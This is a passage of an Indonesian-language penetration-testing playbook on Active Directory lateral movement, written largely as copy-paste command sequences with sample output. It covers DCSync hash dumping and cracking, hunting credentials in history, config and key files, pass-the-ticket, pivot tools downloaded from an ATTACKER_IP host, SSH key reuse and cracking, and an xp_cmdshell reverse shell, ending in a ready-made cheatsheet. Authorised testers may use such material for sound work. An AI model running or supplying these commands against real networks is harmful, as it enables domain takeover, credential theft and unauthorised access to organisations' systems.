SMB  10.10.11.200  445  FILE01  [+] CORP\svc_backup:a87f3a... 
SMB  10.10.11.10   445  DC01    [+] CORP\svc_backup:a87f3a... (Pwn3d!)
```

➡️ Administrator hash valid di DC! Lanjut ke **Langkah 3.3 (DCSync)**

---

### Langkah 3.3 — DCSync (Jika Punya Access ke DC)

Bash

```
# DCSync — minta semua hash dari DC
impacket-secretsdump "CORP/Administrator:$PASSWORD@$DC_IP" -just-dc | tee ~/lateral/loot/dcsync_full.txt

# Hanya user tertentu
impacket-secretsdump "CORP/Administrator:$PASSWORD@$DC_IP" -just-dc-user "Administrator"
impacket-secretsdump "CORP/Administrator:$PASSWORD@$DC_IP" -just-dc-user "krbtgt"

# Dengan hash
impacket-secretsdump "Administrator@$DC_IP" -hashes "aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881" -just-dc
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482b2b2b27a7a6a8e91e0a6692:::
diana:1104:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_backup:1105:aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86:::
```

Bash

```
# Simpan krbtgt hash (untuk Golden Ticket nanti)
grep "krbtgt" ~/lateral/loot/dcsync_full.txt >> ~/lateral/creds/critical_hashes.txt

# Crack offline
hashcat -m 1000 ~/lateral/loot/dcsync_full.txt /usr/share/wordlists/rockyou.txt
```

**OUTPUT GAGAL ❌ — Tidak punya DCSync rights:**

text

```
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_NC
[-] Invalid DN: Error code 0x8007200b
```

➡️ Account tidak punya `DS-Replication-Get-Changes` rights. Perlu privilege escalation atau path lain. Cek BloodHound → `<a href="/docs/ad-bloodhound" class="text-[#00b4d8] hover:underline font-mono font-semibold">36_ad_bloodhound_workflow.md</a>`

---

### Langkah 3.4 — Credential Hunt di Filesystem

Bash

```
# Di dalam Windows shell (via psexec/winrm):

# PowerShell history (goldmine!)
type "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" 2>nul

# Credential Manager
cmdkey /list

# File konfigurasi dengan password
findstr /si "password" C:\*.xml C:\*.config C:\*.txt C:\*.ini 2>nul | head -50

# Web.config files
dir /s /b C:\inetpub\*.config 2>nul
type C:\inetpub\wwwroot\web.config 2>nul

# SSH Keys
dir /s /b C:\Users\*\id_rsa 2>nul
dir /s /b C:\Users\*\.ssh 2>nul

# Unattend files (setup credentials)
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
```

Bash

```
# Di dalam Linux shell:

# Bash history
cat ~/.bash_history 2>/dev/null
cat /home/*/.bash_history 2>/dev/null

# Config files dengan password
grep -r "password" /etc/ 2>/dev/null | grep -v "#" | head -30
grep -r "PASSWORD" /var/www/ 2>/dev/null | head -30

# .env files
find / -name ".env" 2>/dev/null | xargs cat 2>/dev/null

# SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Database credentials
find / -name "wp-config.php" 2>/dev/null | xargs grep "DB_PASSWORD" 2>/dev/null
find / -name "database.yml" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Ketemu password di history:**

text

```
C:\Users\diana\AppData\...\ConsoleHost_history.txt:
net use \\DC01\backup /user:svc_backup BackupPass2024!
impacket-psexec svc_backup:BackupPass2024!@DC01
```

➡️ Simpan credential baru dan validasi:

Bash

```
export NEW_USER="svc_backup"
export NEW_PASS="BackupPass2024!"
echo "$NEW_USER:$NEW_PASS" >> ~/lateral/creds/found_creds.txt
nxc smb 10.10.11.0/24 -u "$NEW_USER" -p "$NEW_PASS" --no-bruteforce
```

---

## ═══════════════════════════════════════

## FASE 4: PASS-THE-TICKET (PTT) — KERBEROS LATERAL MOVEMENT

## ═══════════════════════════════════════

> **Gunakan Fase ini jika:** Punya NT Hash dan ingin Kerberos access, atau sudah punya TGT/ccache

### Langkah 4.1 — Overpass-the-Hash (NT Hash → TGT)

Bash

```
# Step 1: Sync waktu (WAJIB!)
sudo ntpdate -u $DC_IP

# Step 2: Request TGT dari NT Hash
impacket-getTGT "CORP/$USERNAME" -hashes "$NT_HASH" -dc-ip $DC_IP
# Atau dari password
impacket-getTGT "CORP/$USERNAME:$PASSWORD" -dc-ip $DC_IP
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Saving ticket in diana.ccache
```

Bash

```
# Step 3: Load TGT
export KRB5CCNAME="$PWD/diana.ccache"

# Step 4: Verifikasi
klist
```

**OUTPUT BERHASIL ✅ — klist:**

text

```
Credentials cache: FILE:/home/user/diana.ccache
        Principal: diana@CORP.LOCAL

  Valid starting       Expires              Service principal
09/08/2026 14:00:00  09/09/2026 00:00:00  krbtgt/CORP.LOCAL@CORP.LOCAL
```

---

### Langkah 4.2 — Gunakan TGT untuk Lateral Movement

Bash

```
# PENTING: Kerberos BUTUH hostname, bukan IP!
# Tambahkan ke /etc/hosts jika belum
echo "$TARGET_IP FILE01.CORP.LOCAL FILE01" | sudo tee -a /etc/hosts
echo "$DC_IP DC01.CORP.LOCAL DC01" | sudo tee -a /etc/hosts

# Verifikasi resolusi nama
getent hosts "FILE01.CORP.LOCAL"

# Eksekusi dengan Kerberos ticket
impacket-wmiexec -k -no-pass "CORP/$USERNAME@FILE01.CORP.LOCAL"
impacket-psexec -k -no-pass "CORP/$USERNAME@FILE01.CORP.LOCAL"
impacket-smbclient -k -no-pass "CORP/$USERNAME@FILE01.CORP.LOCAL"

# SMB share dengan Kerberos
smbclient "//FILE01.CORP.LOCAL/C$" -k --no-pass
```

**OUTPUT GAGAL ❌ — KRB_AP_ERR_S_PRINCIPAL_UNKNOWN:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```

➡️ Hostname/SPN tidak match. Cek:

Bash

```
# Lihat SPN yang ada di ticket
klist -e

# Pastikan hostname resolve dengan benar
nslookup FILE01 $DC_IP
host FILE01.CORP.LOCAL $DC_IP

# Edit /etc/hosts jika perlu
sudo nano /etc/hosts
```

**OUTPUT GAGAL ❌ — KRB_AP_ERR_SKEW:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

➡️ Sync waktu lagi:

Bash

```
sudo ntpdate -u $DC_IP
# Hapus ticket lama dan request baru
rm diana.ccache
impacket-getTGT "CORP/$USERNAME:$PASSWORD" -dc-ip $DC_IP
export KRB5CCNAME="$PWD/diana.ccache"
```

---

### Langkah 4.3 — Convert Ticket Format

Bash

```
# .kirbi (Windows) → .ccache (Linux)
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME="$PWD/ticket.ccache"

# .ccache → .kirbi (untuk dipakai di Windows)
impacket-ticketConverter ticket.ccache ticket.kirbi
```

---

## ═══════════════════════════════════════

## FASE 5: PIVOTING — AKSES INTERNAL NETWORK

## ═══════════════════════════════════════

> **Gunakan Fase ini jika:** Target berikutnya tidak bisa diakses langsung dari attacker machine

### Langkah 5.1 — Deteksi Kebutuhan Pivot

Bash

```
# Dari host yang sudah dikompromis, lihat network internal
# Di Windows shell:
ipconfig /all
arp -a
route print
net view /domain

# Di Linux shell:
ip addr show
ip route
arp -n
cat /etc/hosts
```

**OUTPUT BERHASIL ✅ — Ada subnet internal:**

text

```
C:\> ipconfig /all
Ethernet adapter Ethernet0:
   IPv4 Address. . .: 10.10.11.200  ← Subnet yang kita tahu
   
Ethernet adapter Ethernet1:
   IPv4 Address. . .: 172.16.1.100  ← SUBNET BARU! Tidak bisa diakses langsung
```

➡️ **Butuh pivot!** Lanjut ke Langkah 5.2

---

### Langkah 5.2 — SSH Tunneling (Jika Pivot Host adalah Linux)

Bash

```
# Method 1: Dynamic SOCKS proxy (paling fleksibel)
ssh -D 1080 -N -f "diana@$PIVOT_HOST"

# Konfigurasi proxychains
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf

# Test koneksi melalui proxy
proxychains nxc smb 172.16.1.10 -u "$USERNAME" -p "$PASSWORD"
proxychains nmap -sT -p 445,5985,22 172.16.1.10

# Method 2: Local port forward (untuk service spesifik)
ssh -L 5985:172.16.1.10:5985 -N -f "diana@$PIVOT_HOST"
evil-winrm -i 127.0.0.1 -u "$USERNAME" -p "$PASSWORD"
```

---

### Langkah 5.3 — Chisel (Universal — Windows/Linux)

Bash

```
# Di attacker machine: Mulai server
./chisel server --reverse --port 8000

# Transfer chisel ke target Windows (pilih salah satu):

# Option A: Via HTTP server
python3 -m http.server 8080 &
# Di Windows target:
# certutil -urlcache -split -f "http://ATTACKER_IP:8080/chisel.exe" C:\Windows\Temp\chisel.exe

# Option B: Via SMB
impacket-smbserver share . -smb2support &
# Di Windows target:
# copy \\ATTACKER_IP\share\chisel.exe C:\Windows\Temp\chisel.exe

# Option C: Via evil-winrm upload
# *Evil-WinRM* PS C:\> upload /opt/chisel/chisel.exe C:\Windows\Temp\chisel.exe

# Di target (jalankan via shell yang sudah ada):
# Windows: C:\Windows\Temp\chisel.exe client ATTACKER_IP:8000 R:socks
# Linux: ./chisel client ATTACKER_IP:8000 R:socks

# Konfigurasikan proxychains
sudo sed -i 's/socks4.*127.0.0.1.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf

# Test
proxychains nxc smb 172.16.1.0/24 -u "$USERNAME" -p "$PASSWORD" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Chisel server menerima koneksi:**

text

```
[SERVER] Listening...
[SERVER] session#1: client connected from 10.10.11.200:54321 (127.0.0.1:1080)
```

---

### Langkah 5.4 — Ligolo-ng (Routed Tunnel — Paling Nyaman)

Bash

```
# Setup di Parrot
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up

# Start proxy
sudo ./proxy -selfcert

# Di target Windows:
# .\agent.exe -connect ATTACKER_IP:11601 -ignore-cert

# Di target Linux:
# ./agent -connect ATTACKER_IP:11601 -ignore-cert

# Di Ligolo console setelah agent connect:
# >> session (pilih session)
# >> ifconfig (lihat internal networks)
# >> start

# Tambahkan route di Parrot
sudo ip route add 172.16.1.0/24 dev ligolo

# Test langsung (tanpa proxychains!)
nxc smb 172.16.1.10 -u "$USERNAME" -p "$PASSWORD"
nmap -sV 172.16.1.10
```

**OUTPUT BERHASIL ✅ — Bisa akses internal network:**

text

```
SMB  172.16.1.10  445  INTERNAL01  [+] CORP\Administrator:... (Pwn3d!)
```

---

## ═══════════════════════════════════════

## FASE 6: RDP LATERAL MOVEMENT

## ═══════════════════════════════════════

### Langkah 6.1 — RDP dengan Password

Bash

```
# Validasi RDP dulu
nxc rdp $TARGET_IP -u "$USERNAME" -p "$PASSWORD"
nmap -p 3389 $TARGET_IP

# Koneksi RDP
xfreerdp /v:$TARGET_IP /u:"$USERNAME" /p:"$PASSWORD" /d:"CORP" +clipboard /dynamic-resolution

# Jika ada TLS error (lab)
xfreerdp /v:$TARGET_IP /u:"$USERNAME" /p:"$PASSWORD" /d:"CORP" /cert:ignore +clipboard
```

**OUTPUT BERHASIL ✅:**

text

```
[INFO] Certificate details: CN=FILE01
[INFO] Connected to 10.10.11.200:3389
```

**OUTPUT GAGAL ❌ — CredSSP/NLA error:**

text

```
[ERROR] credssp_recv_ts_credentials:1117: Authentication failure
```

➡️ Coba dengan:

Bash

```
xfreerdp /v:$TARGET_IP /u:"$USERNAME" /p:"$PASSWORD" /d:"CORP" /sec:rdp
```

---

### Langkah 6.2 — RDP Pass-The-Hash (Restricted Admin Mode)

Bash

```
# Cek apakah Restricted Admin aktif
nxc smb $TARGET_IP -u "$USERNAME" -H "NTHASH" -x "reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin"
```

**OUTPUT BERHASIL ✅ — Restricted Admin aktif:**

text

```
DisableRestrictedAdmin    REG_DWORD    0x0
```

Bash

```
# PTH via RDP
xfreerdp /v:$TARGET_IP /u:"$USERNAME" /d:"CORP" /pth:"NTHASH" +clipboard /cert:ignore
```

**OUTPUT GAGAL ❌ — Restricted Admin disabled:**

text

```
DisableRestrictedAdmin    REG_DWORD    0x1
```

➡️ Tidak bisa PTH via RDP. Gunakan SMB/WinRM sebagai gantinya.

---

## ═══════════════════════════════════════

## FASE 7: SSH LATERAL MOVEMENT (Linux)

## ═══════════════════════════════════════

### Langkah 7.1 — SSH dengan Credential

Bash

```
# Test koneksi
nxc ssh $TARGET_IP -u "$USERNAME" -p "$PASSWORD"

# Koneksi langsung
ssh "$USERNAME@$TARGET_IP"

# Dengan options untuk lab
ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET_IP"

# Port non-standard
ssh -p 2222 "$USERNAME@$TARGET_IP"
```

---

### Langkah 7.2 — SSH Key dari Filesystem

Bash

```
# Cari SSH key dari host sebelumnya
find /home /root /tmp -name "id_rsa" 2>/dev/null
find /home /root -name "*.pem" 2>/dev/null

# Copy dan set permission
cp /home/diana/.ssh/id_rsa ~/lateral/creds/diana_id_rsa
chmod 600 ~/lateral/creds/diana_id_rsa

# Test apakah ada passphrase
ssh-keygen -y -f ~/lateral/creds/diana_id_rsa

# Coba koneksi ke semua user yang mungkin
for user in root diana administrator svc_backup; do
    echo -n "Testing $user@$TARGET_IP: "
    ssh -i ~/lateral/creds/diana_id_rsa -o ConnectTimeout=3 -o StrictHostKeyChecking=no "$user@$TARGET_IP" "id" 2>/dev/null && break
done
```

**OUTPUT BERHASIL ✅:**

text

```
Testing diana@10.10.11.200: uid=1001(diana) gid=1001(diana) groups=1001(diana),27(sudo)
```

---

### Langkah 7.3 — Crack SSH Key Passphrase

Bash

```
# Convert ke format yang bisa di-crack
ssh2john ~/lateral/creds/id_rsa > ~/lateral/creds/id_rsa.hash

# Crack dengan john
john ~/lateral/creds/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Atau hashcat
hashcat -m 22921 ~/lateral/creds/id_rsa.hash /usr/share/wordlists/rockyou.txt
```

**OUTPUT BERHASIL ✅:**

text

```
id_rsa:SecretPass123   (id_rsa)
```

Bash

```
# Gunakan key dengan passphrase
ssh -i ~/lateral/creds/id_rsa "diana@$TARGET_IP"
# Masukkan: SecretPass123
```

**OUTPUT GAGAL ❌ — Tidak bisa crack:**

text

```
0 password hashes cracked, 0 left
```

➡️ Coba wordlist lebih besar atau rule-based:

Bash

```
john ~/lateral/creds/id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt --rules=Best64
# Google: "site:github.com large password wordlist"
```

---

## ═══════════════════════════════════════

## FASE 8: MSSQL LATERAL MOVEMENT

## ═══════════════════════════════════════

### Langkah 8.1 — Akses MSSQL

Bash

```
# Validasi dulu
nxc mssql $TARGET_IP -u "$USERNAME" -p "$PASSWORD"
nxc mssql $TARGET_IP -u "$USERNAME" -H "NTHASH" -d CORP

# Koneksi interaktif
impacket-mssqlclient "CORP/$USERNAME:$PASSWORD@$TARGET_IP" -windows-auth
impacket-mssqlclient "$USERNAME@$TARGET_IP" -hashes "$NT_HASH" -windows-auth
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
SQL>
```

SQL

```
-- 5 Query PERTAMA setelah masuk MSSQL
-- 1. Siapa aku
SELECT SYSTEM_USER;

-- 2. Apakah sysadmin?
SELECT IS_SRVROLEMEMBER('sysadmin');

-- 3. Versi SQL Server
SELECT @@VERSION;

-- 4. Cek xp_cmdshell status
EXEC sp_configure 'xp_cmdshell';

-- 5. Linked servers (potential pivot!)
SELECT name FROM sys.servers WHERE is_linked = 1;
```

---

### Langkah 8.2 — Eksekusi Command via xp_cmdshell

SQL

```
-- Aktifkan xp_cmdshell (jika sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Test
EXEC xp_cmdshell 'whoami';

-- Cari credential
EXEC xp_cmdshell 'cmdkey /list';

-- Network info
EXEC xp_cmdshell 'ipconfig /all';
```

**OUTPUT BERHASIL ✅:**

text

```
output
-----------------------------------
nt service\mssql$sqlexpress
NULL
```

SQL

```
-- Reverse shell via xp_cmdshell (setup listener dulu: nc -lvnp 4444)
EXEC xp_cmdshell 'powershell -e BASE64_ENCODED_REVERSE_SHELL';
```

**OUTPUT GAGAL ❌ — Tidak punya xp_cmdshell rights:**

text

```
[*] ERROR(SQL01): Line 105: User does not have permission to perform this action.
```

➡️ Tidak punya sysadmin. Cek apakah ada linked servers yang bisa dieksploitasi:

SQL

```
-- Coba eksekusi di linked server
EXEC ('SELECT @@SERVERNAME') AT [LINKED_SERVER];
EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKED_SERVER];
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`STATUS_LOGON_FAILURE`|Credential/hash salah|Validasi dengan NetExec, cek domain vs local|
|`KRB_AP_ERR_SKEW`|Clock skew|`sudo ntpdate -u $DC_IP`|
|`KRB_AP_ERR_S_PRINCIPAL_UNKNOWN`|Hostname/SPN salah|Pakai FQDN bukan IP, cek `/etc/hosts`|
|psexec `rpc_s_access_denied`|Service creation blocked / UAC|Coba wmiexec atau evil-winrm|
|`NT_STATUS_ACCESS_DENIED`|User bukan admin|Gunakan credential lain atau temukan privesc|
|evil-winrm `WinRMAuthorizationError`|Tidak di "Remote Management Users"|Cek grup, coba psexec|
|RDP `CredSSP error`|NLA mismatch|Tambah `/sec:rdp` atau `/sec:tls`|
|`Cannot connect SMB`|Firewall / service down|`nmap -p 445 $TARGET`, cek `nxc smb $TARGET`|
|SSH `Permission denied (publickey)`|Key salah atau passphrase|Coba `-i id_rsa`, crack passphrase|
|ProxyChains tidak route|SOCKS tidak aktif|`ss -ltnp|
|Ligolo target unreachable|Route belum ditambah|`sudo ip route add SUBNET dev ligolo`|
|`Ticket expired`|TGT habis masa berlaku|Request TGT baru|
|xp_cmdshell gagal|Tidak punya sysadmin|Cek linked servers, atau privesc SQL dulu|
|`NT_STATUS_BAD_NETWORK_NAME`|Share tidak exist|`nxc smb $TARGET --shares`|
|DCSync `ERROR_DS_DRA_BAD_NC`|Tidak punya replication rights|Perlu DA atau akun dengan DCSync rights|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE

## ═══════════════════════════════════════

text

```
START: Punya Credential
│
├─ FASE 0: Inventory Credential
│   ├─ NT Hash → FASE 1 (NetExec validation)
│   ├─ Password → FASE 1 (NetExec validation)
│   ├─ TGT/ccache → FASE 4 (PTT)
│   ├─ SSH Key → FASE 7 (SSH)
│   └─ Net-NTLMv2 → CRACK dulu! (hashcat -m 5600)
│
├─ FASE 1: NetExec Validation
│   ├─ (Pwn3d!) → FASE 2 (Eksekusi)
│   ├─ [+] tanpa Pwn3d! → Enum share, cek WinRM/RDP
│   └─ [-] gagal → Coba --local-auth, cek domain
│
├─ FASE 2: Remote Execution
│   ├─ Port 5985 open → evil-winrm (PILIHAN UTAMA)
│   ├─ Port 445 + admin → psexec/wmiexec/smbexec
│   ├─ Port 3389 → xfreerdp
│   └─ Setelah masuk → 5 Command Pertama!
│
├─ FASE 3: Credential Harvesting
│   ├─ secretsdump → NT hashes baru
│   ├─ Spray hash baru ke subnet
│   ├─ Administrator hash + DC → DCSync
│   └─ Filesystem hunt → config files, history, SSH keys
│
├─ FASE 4: PTT (Kerberos)
│   ├─ NT Hash → getTGT → .ccache → Kerberos dengan HOSTNAME
│   └─ Selalu sync waktu sebelum Kerberos!
│
├─ FASE 5: Pivoting
│   ├─ SSH -D 1080 → SOCKS proxy → proxychains
│   ├─ Chisel (cross-platform) → R:socks
│   └─ Ligolo-ng → Routed tunnel (TERBAIK, tanpa proxychains)
│
└─ FASE 6-8: Protocol-specific
    ├─ RDP → xfreerdp (GUI)
    ├─ SSH → key atau password
    └─ MSSQL → xp_cmdshell → OS command execution
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export DOMAIN="CORP.LOCAL"; export DC_IP="10.10.11.10"
export TARGET_IP="10.10.11.200"; export TARGET_HOSTNAME="FILE01.CORP.LOCAL"
export USERNAME="diana"; export PASSWORD="Welcome2023!"
export NT_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASHHERE"
mkdir -p ~/lateral/{loot,tickets,shells,logs,creds}

# === VALIDASI ===
nxc smb $TARGET_IP -u "$USERNAME" -p "$PASSWORD"           # Password check
nxc smb $TARGET_IP -u "$USERNAME" -H "NTHASH_ONLY"        # Hash check
nxc smb 10.10.11.0/24 -u "$USERNAME" -p "$PASSWORD" --no-bruteforce  # Subnet sweep
nxc winrm $TARGET_IP -u "$USERNAME" -p "$PASSWORD"        # WinRM check
nxc rdp $TARGET_IP -u "$USERNAME" -p "$PASSWORD"          # RDP check

# === EKSEKUSI SMB ===
impacket-psexec "CORP/$USERNAME:$PASSWORD@$TARGET_IP"     # SYSTEM shell
impacket-wmiexec "CORP/$USERNAME:$PASSWORD@$TARGET_IP"    # User context shell
impacket-smbexec "CORP/$USERNAME:$PASSWORD@$TARGET_IP"    # Alternative

# === HASH-BASED EXECUTION ===
impacket-psexec "$USERNAME@$TARGET_IP" -hashes "$NT_HASH"
impacket-wmiexec "$USERNAME@$TARGET_IP" -hashes "$NT_HASH"
evil-winrm -i $TARGET_IP -u "$USERNAME" -H "NTHASH_ONLY"

# === KERBEROS ===
sudo ntpdate -u $DC_IP                                    # Sync time dulu!
impacket-getTGT "CORP/$USERNAME:$PASSWORD" -dc-ip $DC_IP # Request TGT
export KRB5CCNAME="$PWD/$USERNAME.ccache"                 # Load ticket
klist                                                     # Verify ticket
impacket-wmiexec -k -no-pass "CORP/$USERNAME@$TARGET_HOSTNAME"  # Pakai ticket

# === CREDENTIAL DUMPING ===
impacket-secretsdump "CORP/$USERNAME:$PASSWORD@$TARGET_IP" | tee ~/lateral/loot/dump.txt
nxc smb $TARGET_IP -u "$USERNAME" -H "NTHASH" --sam --lsa
impacket-secretsdump "CORP/Administrator:$PASSWORD@$DC_IP" -just-dc  # DCSync

# === PIVOTING ===
ssh -D 1080 -N -f "$USERNAME@$PIVOT_HOST"                 # SOCKS proxy
./chisel server --reverse --port 8000                     # Chisel server
sudo ip route add 172.16.1.0/24 dev ligolo               # Ligolo route

# === POST-EXPLOITATION ===
# Windows: whoami /all && ipconfig /all && net localgroup administrators && cmdkey /list
# Linux: id && sudo -l && ip addr && find / -name "id_rsa" 2>/dev/null
```

---

## Cross-Service Credential Testing Chart

Setiap kali dapat credential baru dari lateral movement:

text

```
New Credentials Found
│
├─ ─→ Port 22   (SSH)      → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
├──→ Port 445  (SMB)      → <a href="/docs/smb-samba" class="text-[#00b4d8] hover:underline font-mono font-semibold">05_smb_samba_workflow.md</a>
├──→ Port 1433 (MSSQL)    → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
├──→ Port 3306 (MySQL)    → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
├──→ Port 3389 (RDP)      → <a href="/docs/rdp" class="text-[#00b4d8] hover:underline font-mono font-semibold">12_rdp_workflow.md</a>
├──→ Port 5985 (WinRM)    → evil-winrm
├──→ Port 389  (LDAP)     → <a href="/docs/ldap" class="text-[#00b4d8] hover:underline font-mono font-semibold">11_ldap_workflow.md</a>
└──→ AD Environment       → <a href="/docs/ad-initial-enumeration" class="text-[#00b4d8] hover:underline font-mono font-semibold">35_ad_initial_enumeration_workflow.md</a>
     ├── Kerberoasting     → <a href="/docs/kerberoasting-asreproasting" class="text-[#00b4d8] hover:underline font-mono font-semibold">37_kerberoasting_asreproasting_workflow.md</a>
     ├── BloodHound        → <a href="/docs/ad-bloodhound" class="text-[#00b4d8] hover:underline font-mono font-semibold">36_ad_bloodhound_workflow.md</a>
     └── Domain Persistence → <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
```

---

> **➡️ NEXT STEPS setelah Lateral Movement:**
> 
> - Dapat SYSTEM/root di Windows → `<a href="/docs/windows-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">45_windows_privesc_workflow.md</a>` (privesc analysis) atau [🔐 Workflow 43 — Domain Persistence](/docs/domain-persistence)
> - Dapat shell di Linux → `<a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>`
> - Dapat krbtgt hash → `<a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>` (Golden Ticket)
> - Butuh akses internal network → Setup pivot dulu (Fase 5)
> - Punya SeImpersonatePrivilege → `<a href="/docs/token-impersonation" class="text-[#00b4d8] hover:underline font-mono font-semibold">46_token_impersonation_workflow.md</a>`

[](https://messages-prod.27c852f3500f38c1e7786e2c9ff9e48f.r2.cloudflarestorage.com/aad5bafd-ac04-4d8f-9667-3d87b6995a58/1789141517002-42_lateral_movement_workflow.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=b33de61d4f22a31b59b25364ab5037c5%2F20260911%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20260911T154518Z&X-Amz-Expires=3600&X-Amz-Signature=4a7b6675da61cdca4c42133b7176090cbb0b288749d0f4cbecfbafbe71b54418&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)